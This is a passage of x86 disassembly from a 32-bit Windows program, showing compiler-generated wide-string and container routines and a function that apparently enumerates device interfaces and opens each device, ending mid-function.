  402fbc:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402fc1:	8b 1f                	mov    (%edi),%ebx
  402fc3:	83 c4 04             	add    $0x4,%esp
  402fc6:	2b cb                	sub    %ebx,%ecx
  402fc8:	f7 e9                	imul   %ecx
  402fca:	c1 fa 02             	sar    $0x2,%edx
  402fcd:	8b c2                	mov    %edx,%eax
  402fcf:	c1 e8 1f             	shr    $0x1f,%eax
  402fd2:	03 c2                	add    %edx,%eax
  402fd4:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  402fd7:	c1 e1 03             	shl    $0x3,%ecx
  402fda:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402fe0:	72 12                	jb     0x402ff4
  402fe2:	8b 53 fc             	mov    -0x4(%ebx),%edx
  402fe5:	83 c1 23             	add    $0x23,%ecx
  402fe8:	2b da                	sub    %edx,%ebx
  402fea:	8d 43 fc             	lea    -0x4(%ebx),%eax
  402fed:	83 f8 1f             	cmp    $0x1f,%eax
  402ff0:	77 5e                	ja     0x403050
  402ff2:	8b da                	mov    %edx,%ebx
  402ff4:	51                   	push   %ecx
  402ff5:	53                   	push   %ebx
  402ff6:	e8 11 92 00 00       	call   0x40c20c
  402ffb:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  402ffe:	83 c4 08             	add    $0x8,%esp
  403001:	8d 04 5b             	lea    (%ebx,%ebx,2),%eax
  403004:	89 37                	mov    %esi,(%edi)
  403006:	8d 04 c6             	lea    (%esi,%eax,8),%eax
  403009:	89 47 04             	mov    %eax,0x4(%edi)
  40300c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40300f:	03 c6                	add    %esi,%eax
  403011:	89 47 08             	mov    %eax,0x8(%edi)
  403014:	8b 07                	mov    (%edi),%eax
  403016:	03 45 d0             	add    -0x30(%ebp),%eax
  403019:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40301c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403023:	59                   	pop    %ecx
  403024:	5f                   	pop    %edi
  403025:	5e                   	pop    %esi
  403026:	5b                   	pop    %ebx
  403027:	8b e5                	mov    %ebp,%esp
  403029:	5d                   	pop    %ebp
  40302a:	c2 08 00             	ret    $0x8
  40302d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403030:	50                   	push   %eax
  403031:	50                   	push   %eax
  403032:	e8 99 fb ff ff       	call   0x402bd0
  403037:	ff 75 e0             	push   -0x20(%ebp)
  40303a:	ff 75 e8             	push   -0x18(%ebp)
  40303d:	e8 ae fb ff ff       	call   0x402bf0
  403042:	6a 00                	push   $0x0
  403044:	6a 00                	push   $0x0
  403046:	e8 b9 ab 00 00       	call   0x40dc04
  40304b:	e8 80 e5 ff ff       	call   0x4015d0
  403050:	e8 44 d1 00 00       	call   0x410199
  403055:	cc                   	int3
  403056:	cc                   	int3
  403057:	cc                   	int3
  403058:	cc                   	int3
  403059:	cc                   	int3
  40305a:	cc                   	int3
  40305b:	cc                   	int3
  40305c:	cc                   	int3
  40305d:	cc                   	int3
  40305e:	cc                   	int3
  40305f:	cc                   	int3
  403060:	55                   	push   %ebp
  403061:	8b ec                	mov    %esp,%ebp
  403063:	83 ec 08             	sub    $0x8,%esp
  403066:	53                   	push   %ebx
  403067:	8b d9                	mov    %ecx,%ebx
  403069:	b9 fe ff ff 7f       	mov    $0x7ffffffe,%ecx
  40306e:	8b c1                	mov    %ecx,%eax
  403070:	56                   	push   %esi
  403071:	57                   	push   %edi
  403072:	8b 53 10             	mov    0x10(%ebx),%edx
  403075:	2b c2                	sub    %edx,%eax
  403077:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40307a:	83 f8 01             	cmp    $0x1,%eax
  40307d:	0f 82 1f 01 00 00    	jb     0x4031a2
  403083:	8b 73 14             	mov    0x14(%ebx),%esi
  403086:	8d 7a 01             	lea    0x1(%edx),%edi
  403089:	83 cf 07             	or     $0x7,%edi
  40308c:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40308f:	3b f9                	cmp    %ecx,%edi
  403091:	76 04                	jbe    0x403097
  403093:	8b f9                	mov    %ecx,%edi
  403095:	eb 18                	jmp    0x4030af
  403097:	8b c6                	mov    %esi,%eax
  403099:	d1 e8                	shr    $1,%eax
  40309b:	2b c8                	sub    %eax,%ecx
  40309d:	3b f1                	cmp    %ecx,%esi
  40309f:	76 07                	jbe    0x4030a8
  4030a1:	bf fe ff ff 7f       	mov    $0x7ffffffe,%edi
  4030a6:	eb 07                	jmp    0x4030af
  4030a8:	03 c6                	add    %esi,%eax
  4030aa:	3b f8                	cmp    %eax,%edi
  4030ac:	0f 42 f8             	cmovb  %eax,%edi
  4030af:	8d 47 01             	lea    0x1(%edi),%eax
  4030b2:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  4030b5:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4030ba:	76 05                	jbe    0x4030c1
  4030bc:	83 c9 ff             	or     $0xffffffff,%ecx
  4030bf:	eb 08                	jmp    0x4030c9
  4030c1:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4030c7:	72 2a                	jb     0x4030f3
  4030c9:	8d 41 23             	lea    0x23(%ecx),%eax
  4030cc:	83 ca ff             	or     $0xffffffff,%edx
  4030cf:	3b c1                	cmp    %ecx,%eax
  4030d1:	0f 46 c2             	cmovbe %edx,%eax
  4030d4:	50                   	push   %eax
  4030d5:	e8 40 91 00 00       	call   0x40c21a
  4030da:	83 c4 04             	add    $0x4,%esp
  4030dd:	85 c0                	test   %eax,%eax
  4030df:	0f 84 c2 00 00 00    	je     0x4031a7
  4030e5:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4030e8:	8d 70 23             	lea    0x23(%eax),%esi
  4030eb:	83 e6 e0             	and    $0xffffffe0,%esi
  4030ee:	89 46 fc             	mov    %eax,-0x4(%esi)
  4030f1:	eb 16                	jmp    0x403109
  4030f3:	85 c9                	test   %ecx,%ecx
  4030f5:	74 10                	je     0x403107
  4030f7:	51                   	push   %ecx
  4030f8:	e8 1d 91 00 00       	call   0x40c21a
  4030fd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403100:	83 c4 04             	add    $0x4,%esp
  403103:	8b f0                	mov    %eax,%esi
  403105:	eb 02                	jmp    0x403109
  403107:	33 f6                	xor    %esi,%esi
  403109:	83 7d f8 08          	cmpl   $0x8,-0x8(%ebp)
  40310d:	8d 42 01             	lea    0x1(%edx),%eax
  403110:	89 7b 14             	mov    %edi,0x14(%ebx)
  403113:	8d 3c 12             	lea    (%edx,%edx,1),%edi
  403116:	89 43 10             	mov    %eax,0x10(%ebx)
  403119:	72 60                	jb     0x40317b
  40311b:	8b 3b                	mov    (%ebx),%edi
  40311d:	8d 04 12             	lea    (%edx,%edx,1),%eax
  403120:	50                   	push   %eax
  403121:	57                   	push   %edi
  403122:	56                   	push   %esi
  403123:	e8 28 c9 00 00       	call   0x40fa50
  403128:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40312b:	83 c4 0c             	add    $0xc,%esp
  40312e:	66 8b 45 10          	mov    0x10(%ebp),%ax
  403132:	8d 0c 12             	lea    (%edx,%edx,1),%ecx
  403135:	66 89 04 31          	mov    %ax,(%ecx,%esi,1)
  403139:	33 c0                	xor    %eax,%eax
  40313b:	66 89 44 31 02       	mov    %ax,0x2(%ecx,%esi,1)
  403140:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403143:	8d 0c 45 02 00 00 00 	lea    0x2(,%eax,2),%ecx
  40314a:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  403150:	72 12                	jb     0x403164
  403152:	8b 57 fc             	mov    -0x4(%edi),%edx
  403155:	83 c1 23             	add    $0x23,%ecx
  403158:	2b fa                	sub    %edx,%edi
  40315a:	8d 47 fc             	lea    -0x4(%edi),%eax
  40315d:	83 f8 1f             	cmp    $0x1f,%eax
  403160:	77 45                	ja     0x4031a7
  403162:	8b fa                	mov    %edx,%edi
  403164:	51                   	push   %ecx
  403165:	57                   	push   %edi
  403166:	e8 a1 90 00 00       	call   0x40c20c
  40316b:	83 c4 08             	add    $0x8,%esp
  40316e:	89 33                	mov    %esi,(%ebx)
  403170:	8b c3                	mov    %ebx,%eax
  403172:	5f                   	pop    %edi
  403173:	5e                   	pop    %esi
  403174:	5b                   	pop    %ebx
  403175:	8b e5                	mov    %ebp,%esp
  403177:	5d                   	pop    %ebp
  403178:	c2 0c 00             	ret    $0xc
  40317b:	57                   	push   %edi
  40317c:	53                   	push   %ebx
  40317d:	56                   	push   %esi
  40317e:	e8 cd c8 00 00       	call   0x40fa50
  403183:	66 8b 4d 10          	mov    0x10(%ebp),%cx
  403187:	83 c4 0c             	add    $0xc,%esp
  40318a:	33 c0                	xor    %eax,%eax
  40318c:	66 89 0c 37          	mov    %cx,(%edi,%esi,1)
  403190:	66 89 44 37 02       	mov    %ax,0x2(%edi,%esi,1)
  403195:	8b c3                	mov    %ebx,%eax
  403197:	89 33                	mov    %esi,(%ebx)
  403199:	5f                   	pop    %edi
  40319a:	5e                   	pop    %esi
  40319b:	5b                   	pop    %ebx
  40319c:	8b e5                	mov    %ebp,%esp
  40319e:	5d                   	pop    %ebp
  40319f:	c2 0c 00             	ret    $0xc
  4031a2:	e8 39 e4 ff ff       	call   0x4015e0
  4031a7:	e8 ed cf 00 00       	call   0x410199
  4031ac:	cc                   	int3
  4031ad:	cc                   	int3
  4031ae:	cc                   	int3
  4031af:	cc                   	int3
  4031b0:	55                   	push   %ebp
  4031b1:	8b ec                	mov    %esp,%ebp
  4031b3:	56                   	push   %esi
  4031b4:	57                   	push   %edi
  4031b5:	8b fa                	mov    %edx,%edi
  4031b7:	8b f1                	mov    %ecx,%esi
  4031b9:	3b f7                	cmp    %edi,%esi
  4031bb:	74 52                	je     0x40320f
  4031bd:	0f 1f 00             	nopl   (%eax)
  4031c0:	8b 4e 14             	mov    0x14(%esi),%ecx
  4031c3:	83 f9 08             	cmp    $0x8,%ecx
  4031c6:	72 2d                	jb     0x4031f5
  4031c8:	8b 06                	mov    (%esi),%eax
  4031ca:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  4031d1:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4031d7:	72 12                	jb     0x4031eb
  4031d9:	8b 50 fc             	mov    -0x4(%eax),%edx
  4031dc:	83 c1 23             	add    $0x23,%ecx
  4031df:	2b c2                	sub    %edx,%eax
  4031e1:	83 c0 fc             	add    $0xfffffffc,%eax
  4031e4:	83 f8 1f             	cmp    $0x1f,%eax
  4031e7:	77 2a                	ja     0x403213
  4031e9:	8b c2                	mov    %edx,%eax
  4031eb:	51                   	push   %ecx
  4031ec:	50                   	push   %eax
  4031ed:	e8 1a 90 00 00       	call   0x40c20c
  4031f2:	83 c4 08             	add    $0x8,%esp
  4031f5:	33 c0                	xor    %eax,%eax
  4031f7:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4031fe:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  403205:	66 89 06             	mov    %ax,(%esi)
  403208:	83 c6 18             	add    $0x18,%esi
  40320b:	3b f7                	cmp    %edi,%esi
  40320d:	75 b1                	jne    0x4031c0
  40320f:	5f                   	pop    %edi
  403210:	5e                   	pop    %esi
  403211:	5d                   	pop    %ebp
  403212:	c3                   	ret
  403213:	e8 81 cf 00 00       	call   0x410199
  403218:	cc                   	int3
  403219:	cc                   	int3
  40321a:	cc                   	int3
  40321b:	cc                   	int3
  40321c:	cc                   	int3
  40321d:	cc                   	int3
  40321e:	cc                   	int3
  40321f:	cc                   	int3
  403220:	55                   	push   %ebp
  403221:	8b ec                	mov    %esp,%ebp
  403223:	51                   	push   %ecx
  403224:	53                   	push   %ebx
  403225:	56                   	push   %esi
  403226:	8b f1                	mov    %ecx,%esi
  403228:	57                   	push   %edi
  403229:	8b 7d 08             	mov    0x8(%ebp),%edi
  40322c:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  403233:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  40323a:	83 7f 14 08          	cmpl   $0x8,0x14(%edi)
  40323e:	8b 47 10             	mov    0x10(%edi),%eax
  403241:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403244:	72 02                	jb     0x403248
  403246:	8b 3f                	mov    (%edi),%edi
  403248:	83 f8 08             	cmp    $0x8,%eax
  40324b:	73 1c                	jae    0x403269
  40324d:	0f 10 07             	movups (%edi),%xmm0
  403250:	bb 07 00 00 00       	mov    $0x7,%ebx
  403255:	5f                   	pop    %edi
  403256:	0f 11 06             	movups %xmm0,(%esi)
  403259:	89 46 10             	mov    %eax,0x10(%esi)
  40325c:	8b c6                	mov    %esi,%eax
  40325e:	89 5e 14             	mov    %ebx,0x14(%esi)
  403261:	5e                   	pop    %esi
  403262:	5b                   	pop    %ebx
  403263:	8b e5                	mov    %ebp,%esp
  403265:	5d                   	pop    %ebp
  403266:	c2 04 00             	ret    $0x4
  403269:	8b d8                	mov    %eax,%ebx
  40326b:	b8 fe ff ff 7f       	mov    $0x7ffffffe,%eax
  403270:	83 cb 07             	or     $0x7,%ebx
  403273:	3b d8                	cmp    %eax,%ebx
  403275:	0f 47 d8             	cmova  %eax,%ebx
  403278:	33 c9                	xor    %ecx,%ecx
  40327a:	8b c3                	mov    %ebx,%eax
  40327c:	83 c0 01             	add    $0x1,%eax
  40327f:	0f 92 c1             	setb   %cl
  403282:	f7 d9                	neg    %ecx
  403284:	0b c8                	or     %eax,%ecx
  403286:	8d 14 09             	lea    (%ecx,%ecx,1),%edx
  403289:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  40328f:	76 05                	jbe    0x403296
  403291:	83 ca ff             	or     $0xffffffff,%edx
  403294:	eb 08                	jmp    0x40329e
  403296:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  40329c:	72 23                	jb     0x4032c1
  40329e:	8d 42 23             	lea    0x23(%edx),%eax
  4032a1:	83 c9 ff             	or     $0xffffffff,%ecx
  4032a4:	3b c2                	cmp    %edx,%eax
  4032a6:	0f 46 c1             	cmovbe %ecx,%eax
  4032a9:	50                   	push   %eax
  4032aa:	e8 6b 8f 00 00       	call   0x40c21a
  4032af:	83 c4 04             	add    $0x4,%esp
  4032b2:	85 c0                	test   %eax,%eax
  4032b4:	74 49                	je     0x4032ff
  4032b6:	8d 48 23             	lea    0x23(%eax),%ecx
  4032b9:	83 e1 e0             	and    $0xffffffe0,%ecx
  4032bc:	89 41 fc             	mov    %eax,-0x4(%ecx)
  4032bf:	eb 13                	jmp    0x4032d4
  4032c1:	85 d2                	test   %edx,%edx
  4032c3:	74 0d                	je     0x4032d2
  4032c5:	52                   	push   %edx
  4032c6:	e8 4f 8f 00 00       	call   0x40c21a
  4032cb:	83 c4 04             	add    $0x4,%esp
  4032ce:	8b c8                	mov    %eax,%ecx
  4032d0:	eb 02                	jmp    0x4032d4
  4032d2:	33 c9                	xor    %ecx,%ecx
  4032d4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4032d7:	89 0e                	mov    %ecx,(%esi)
  4032d9:	8d 04 45 02 00 00 00 	lea    0x2(,%eax,2),%eax
  4032e0:	50                   	push   %eax
  4032e1:	57                   	push   %edi
  4032e2:	51                   	push   %ecx
  4032e3:	e8 68 c7 00 00       	call   0x40fa50
  4032e8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4032eb:	83 c4 0c             	add    $0xc,%esp
  4032ee:	89 46 10             	mov    %eax,0x10(%esi)
  4032f1:	8b c6                	mov    %esi,%eax
  4032f3:	89 5e 14             	mov    %ebx,0x14(%esi)
  4032f6:	5f                   	pop    %edi
  4032f7:	5e                   	pop    %esi
  4032f8:	5b                   	pop    %ebx
  4032f9:	8b e5                	mov    %ebp,%esp
  4032fb:	5d                   	pop    %ebp
  4032fc:	c2 04 00             	ret    $0x4
  4032ff:	e8 95 ce 00 00       	call   0x410199
  403304:	cc                   	int3
  403305:	cc                   	int3
  403306:	cc                   	int3
  403307:	cc                   	int3
  403308:	cc                   	int3
  403309:	cc                   	int3
  40330a:	cc                   	int3
  40330b:	cc                   	int3
  40330c:	cc                   	int3
  40330d:	cc                   	int3
  40330e:	cc                   	int3
  40330f:	cc                   	int3
  403310:	55                   	push   %ebp
  403311:	8b ec                	mov    %esp,%ebp
  403313:	8b 45 08             	mov    0x8(%ebp),%eax
  403316:	56                   	push   %esi
  403317:	57                   	push   %edi
  403318:	8b fa                	mov    %edx,%edi
  40331a:	3b cf                	cmp    %edi,%ecx
  40331c:	74 6e                	je     0x40338c
  40331e:	8b f0                	mov    %eax,%esi
  403320:	8d 51 2c             	lea    0x2c(%ecx),%edx
  403323:	2b f1                	sub    %ecx,%esi
  403325:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  40332c:	8d 52 30             	lea    0x30(%edx),%edx
  40332f:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%eax)
  403336:	33 c9                	xor    %ecx,%ecx
  403338:	0f 10 42 a4          	movups -0x5c(%edx),%xmm0
  40333c:	0f 11 00             	movups %xmm0,(%eax)
  40333f:	f3 0f 7e 42 b4       	movq   -0x4c(%edx),%xmm0
  403344:	66 0f d6 40 10       	movq   %xmm0,0x10(%eax)
  403349:	c7 42 b4 00 00 00 00 	movl   $0x0,-0x4c(%edx)
  403350:	c7 42 b8 07 00 00 00 	movl   $0x7,-0x48(%edx)
  403357:	66 89 4a a4          	mov    %cx,-0x5c(%edx)
  40335b:	89 48 28             	mov    %ecx,0x28(%eax)
  40335e:	89 4c 16 d0          	mov    %ecx,-0x30(%esi,%edx,1)
  403362:	0f 10 42 bc          	movups -0x44(%edx),%xmm0
  403366:	0f 11 40 18          	movups %xmm0,0x18(%eax)
  40336a:	f3 0f 7e 42 cc       	movq   -0x34(%edx),%xmm0
  40336f:	66 0f d6 40 28       	movq   %xmm0,0x28(%eax)
  403374:	83 c0 30             	add    $0x30,%eax
  403377:	89 4a cc             	mov    %ecx,-0x34(%edx)
  40337a:	c7 42 d0 07 00 00 00 	movl   $0x7,-0x30(%edx)
  403381:	66 89 4a bc          	mov    %cx,-0x44(%edx)
  403385:	8d 4a d4             	lea    -0x2c(%edx),%ecx
  403388:	3b cf                	cmp    %edi,%ecx
  40338a:	75 99                	jne    0x403325
  40338c:	5f                   	pop    %edi
  40338d:	5e                   	pop    %esi
  40338e:	5d                   	pop    %ebp
  40338f:	c3                   	ret
  403390:	55                   	push   %ebp
  403391:	8b ec                	mov    %esp,%ebp
  403393:	56                   	push   %esi
  403394:	8b 75 08             	mov    0x8(%ebp),%esi
  403397:	57                   	push   %edi
  403398:	3b ca                	cmp    %edx,%ecx
  40339a:	74 40                	je     0x4033dc
  40339c:	8b c6                	mov    %esi,%eax
  40339e:	2b c1                	sub    %ecx,%eax
  4033a0:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4033a7:	33 ff                	xor    %edi,%edi
  4033a9:	c7 44 08 14 00 00 00 	movl   $0x0,0x14(%eax,%ecx,1)
  4033b0:	00 
  4033b1:	0f 10 01             	movups (%ecx),%xmm0
  4033b4:	0f 11 06             	movups %xmm0,(%esi)
  4033b7:	f3 0f 7e 41 10       	movq   0x10(%ecx),%xmm0
  4033bc:	66 0f d6 46 10       	movq   %xmm0,0x10(%esi)
  4033c1:	83 c6 18             	add    $0x18,%esi
  4033c4:	c7 41 10 00 00 00 00 	movl   $0x0,0x10(%ecx)
  4033cb:	c7 41 14 07 00 00 00 	movl   $0x7,0x14(%ecx)
  4033d2:	66 89 39             	mov    %di,(%ecx)
  4033d5:	83 c1 18             	add    $0x18,%ecx
  4033d8:	3b ca                	cmp    %edx,%ecx
  4033da:	75 c4                	jne    0x4033a0
  4033dc:	51                   	push   %ecx
  4033dd:	8b d6                	mov    %esi,%edx
  4033df:	8b ce                	mov    %esi,%ecx
  4033e1:	e8 ca fd ff ff       	call   0x4031b0
  4033e6:	83 c4 04             	add    $0x4,%esp
  4033e9:	8b c6                	mov    %esi,%eax
  4033eb:	5f                   	pop    %edi
  4033ec:	5e                   	pop    %esi
  4033ed:	5d                   	pop    %ebp
  4033ee:	c3                   	ret
  4033ef:	cc                   	int3
  4033f0:	b8 50 c9 42 00       	mov    $0x42c950,%eax
  4033f5:	c3                   	ret
  4033f6:	cc                   	int3
  4033f7:	cc                   	int3
  4033f8:	cc                   	int3
  4033f9:	cc                   	int3
  4033fa:	cc                   	int3
  4033fb:	cc                   	int3
  4033fc:	cc                   	int3
  4033fd:	cc                   	int3
  4033fe:	cc                   	int3
  4033ff:	cc                   	int3
  403400:	55                   	push   %ebp
  403401:	8b ec                	mov    %esp,%ebp
  403403:	6a ff                	push   $0xffffffff
  403405:	68 5f 05 42 00       	push   $0x42055f
  40340a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403410:	50                   	push   %eax
  403411:	81 ec a4 00 00 00    	sub    $0xa4,%esp
  403417:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  40341c:	33 c5                	xor    %ebp,%eax
  40341e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403421:	53                   	push   %ebx
  403422:	56                   	push   %esi
  403423:	57                   	push   %edi
  403424:	50                   	push   %eax
  403425:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403428:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40342e:	8b f1                	mov    %ecx,%esi
  403430:	89 b5 54 ff ff ff    	mov    %esi,-0xac(%ebp)
  403436:	89 b5 5c ff ff ff    	mov    %esi,-0xa4(%ebp)
  40343c:	0f 57 c0             	xorps  %xmm0,%xmm0
  40343f:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  403446:	66 0f d6 45 e4       	movq   %xmm0,-0x1c(%ebp)
  40344b:	89 b5 5c ff ff ff    	mov    %esi,-0xa4(%ebp)
  403451:	c6 85 63 ff ff ff 00 	movb   $0x0,-0x9d(%ebp)
  403458:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40345f:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  403466:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40346d:	6a 12                	push   $0x12
  40346f:	6a 00                	push   $0x0
  403471:	6a 00                	push   $0x0
  403473:	68 40 13 42 00       	push   $0x421340
  403478:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40347f:	ff 15 fc 11 42 00    	call   *0x4211fc
  403485:	8b d8                	mov    %eax,%ebx
  403487:	89 9d 58 ff ff ff    	mov    %ebx,-0xa8(%ebp)
  40348d:	83 fb ff             	cmp    $0xffffffff,%ebx
  403490:	75 16                	jne    0x4034a8
  403492:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403495:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403498:	89 4e 04             	mov    %ecx,0x4(%esi)
  40349b:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40349e:	89 06                	mov    %eax,(%esi)
  4034a0:	89 4e 08             	mov    %ecx,0x8(%esi)
  4034a3:	e9 37 03 00 00       	jmp    0x4037df
  4034a8:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4034ab:	c7 85 5c ff ff ff 00 	movl   $0x0,-0xa4(%ebp)
  4034b2:	00 00 00 
  4034b5:	50                   	push   %eax
  4034b6:	6a 00                	push   $0x0
  4034b8:	68 40 13 42 00       	push   $0x421340
  4034bd:	0f 57 c0             	xorps  %xmm0,%xmm0
  4034c0:	c7 45 bc 1c 00 00 00 	movl   $0x1c,-0x44(%ebp)
  4034c7:	6a 00                	push   $0x0
  4034c9:	53                   	push   %ebx
  4034ca:	66 0f 13 45 c0       	movlpd %xmm0,-0x40(%ebp)
  4034cf:	66 0f 13 45 c8       	movlpd %xmm0,-0x38(%ebp)
  4034d4:	66 0f 13 45 d0       	movlpd %xmm0,-0x30(%ebp)
  4034d9:	ff 15 00 12 42 00    	call   *0x421200
  4034df:	85 c0                	test   %eax,%eax
  4034e1:	0f 84 97 02 00 00    	je     0x40377e
  4034e7:	8b 3d f4 11 42 00    	mov    0x4211f4,%edi
  4034ed:	0f 1f 00             	nopl   (%eax)
  4034f0:	6a 00                	push   $0x0
  4034f2:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  4034f8:	c7 85 64 ff ff ff 00 	movl   $0x0,-0x9c(%ebp)
  4034ff:	00 00 00 
  403502:	50                   	push   %eax
  403503:	6a 00                	push   $0x0
  403505:	6a 00                	push   $0x0
  403507:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40350a:	50                   	push   %eax
  40350b:	53                   	push   %ebx
  40350c:	ff d7                	call   *%edi
  40350e:	ff 15 cc 10 42 00    	call   *0x4210cc
  403514:	83 f8 7a             	cmp    $0x7a,%eax
  403517:	0f 85 1a 02 00 00    	jne    0x403737
  40351d:	8b 85 64 ff ff ff    	mov    -0x9c(%ebp),%eax
  403523:	85 c0                	test   %eax,%eax
  403525:	0f 84 0c 02 00 00    	je     0x403737
  40352b:	51                   	push   %ecx
  40352c:	0f 57 c0             	xorps  %xmm0,%xmm0
  40352f:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  403536:	50                   	push   %eax
  403537:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40353a:	66 0f d6 45 d8       	movq   %xmm0,-0x28(%ebp)
  40353f:	e8 6c e4 ff ff       	call   0x4019b0
  403544:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  403548:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  40354e:	8b 75 d8             	mov    -0x28(%ebp),%esi
  403551:	6a 00                	push   $0x0
  403553:	50                   	push   %eax
  403554:	8d 45 bc             	lea    -0x44(%ebp),%eax
  403557:	c7 06 06 00 00 00    	movl   $0x6,(%esi)
  40355d:	ff b5 64 ff ff ff    	push   -0x9c(%ebp)
  403563:	56                   	push   %esi
  403564:	50                   	push   %eax
  403565:	53                   	push   %ebx
  403566:	ff d7                	call   *%edi
  403568:	85 c0                	test   %eax,%eax
  40356a:	75 32                	jne    0x40359e
  40356c:	88 45 fc             	mov    %al,-0x4(%ebp)
  40356f:	8b c6                	mov    %esi,%eax
  403571:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  403574:	2b ce                	sub    %esi,%ecx
  403576:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40357c:	72 14                	jb     0x403592
  40357e:	8b 76 fc             	mov    -0x4(%esi),%esi
  403581:	83 c1 23             	add    $0x23,%ecx
  403584:	2b c6                	sub    %esi,%eax
  403586:	83 c0 fc             	add    $0xfffffffc,%eax
  403589:	83 f8 1f             	cmp    $0x1f,%eax
  40358c:	0f 87 88 02 00 00    	ja     0x40381a
  403592:	51                   	push   %ecx
  403593:	56                   	push   %esi
  403594:	e8 73 8c 00 00       	call   0x40c20c
  403599:	e9 81 01 00 00       	jmp    0x40371f
  40359e:	6a 00                	push   $0x0
  4035a0:	68 80 00 00 00       	push   $0x80
  4035a5:	6a 03                	push   $0x3
  4035a7:	6a 00                	push   $0x0
  4035a9:	6a 03                	push   $0x3
  4035ab:	68 00 00 00 c0       	push   $0xc0000000
  4035b0:	8d 7e 04             	lea    0x4(%esi),%edi
  4035b3:	57                   	push   %edi
  4035b4:	ff 15 90 10 42 00    	call   *0x421090
  4035ba:	8b d8                	mov    %eax,%ebx
  4035bc:	83 fb ff             	cmp    $0xffffffff,%ebx
  4035bf:	0f 84 20 01 00 00    	je     0x4036e5
  4035c5:	8b d3                	mov    %ebx,%edx
  4035c7:	8d 8d 68 ff ff ff    	lea    -0x98(%ebp),%ecx
  4035cd:	e8 3e 03 00 00       	call   0x403910
  4035d2:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4035d6:	8d 55 9c             	lea    -0x64(%ebp),%edx
  4035d9:	83 7d b0 08          	cmpl   $0x8,-0x50(%ebp)
  4035dd:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  4035e3:	57                   	push   %edi
  4035e4:	0f 43 55 9c          	cmovae -0x64(%ebp),%edx
  4035e8:	8d 45 84             	lea    -0x7c(%ebp),%eax
  4035eb:	83 7d 80 08          	cmpl   $0x8,-0x80(%ebp)
  4035ef:	52                   	push   %edx
  4035f0:	0f 43 8d 6c ff ff ff 	cmovae -0x94(%ebp),%ecx
  4035f7:	83 7d 98 08          	cmpl   $0x8,-0x68(%ebp)
  4035fb:	51                   	push   %ecx
  4035fc:	0f 43 45 84          	cmovae -0x7c(%ebp),%eax
  403600:	50                   	push   %eax
  403601:	68 c0 6d 42 00       	push   $0x426dc0
  403606:	6a 14                	push   $0x14
  403608:	6a 03                	push   $0x3
  40360a:	51                   	push   %ecx
  40360b:	33 c9                	xor    %ecx,%ecx
  40360d:	e8 1e 4f 00 00       	call   0x408530
  403612:	83 c4 04             	add    $0x4,%esp
  403615:	50                   	push   %eax
  403616:	e8 55 50 00 00       	call   0x408670
  40361b:	83 c4 20             	add    $0x20,%esp
  40361e:	83 7d ac 00          	cmpl   $0x0,-0x54(%ebp)
  403622:	0f 84 80 00 00 00    	je     0x4036a8
  403628:	83 7d b0 08          	cmpl   $0x8,-0x50(%ebp)
  40362c:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40362f:	0f 43 45 9c          	cmovae -0x64(%ebp),%eax
  403633:	0f b7 00             	movzwl (%eax),%eax
  403636:	50                   	push   %eax
  403637:	e8 b1 e3 00 00       	call   0x4119ed
  40363c:	83 c4 04             	add    $0x4,%esp
  40363f:	85 c0                	test   %eax,%eax
  403641:	75 65                	jne    0x4036a8
  403643:	8a 85 68 ff ff ff    	mov    -0x98(%ebp),%al
